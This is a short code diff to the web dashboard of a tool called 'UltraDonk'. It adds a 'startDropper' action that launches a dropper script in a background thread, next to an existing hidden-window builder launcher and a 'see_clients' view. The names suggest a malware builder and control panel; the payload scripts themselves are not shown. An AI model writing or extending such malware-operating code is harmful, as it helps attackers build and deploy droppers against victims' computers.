@@ -77,11 +77,20 @@ def dashboard():
             noti = "Thank you for using UltraDonk - Builder started in background!"
             def run_builder():
                 subprocess.run(["python", "builder.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-            
             # Create and start the thread
             builder_thread = threading.Thread(target=run_builder)
             builder_thread.daemon = True
             builder_thread.start()
+
+        if action=="startDropper":
+            noti="Thank you for using UltraDonk - The dropper started in background!"
+            def run_dropper():
+                subprocess.run(["python","donk_dropper.py"])
+            #start thread
+            dropper_tread=threading.Thread(target=run_dropper)
+            dropper_tread.daemon=True
+            dropper_tread.start()
+
             
             return render_template("dashboard.html", noti=noti)
         elif action=="see_clients":
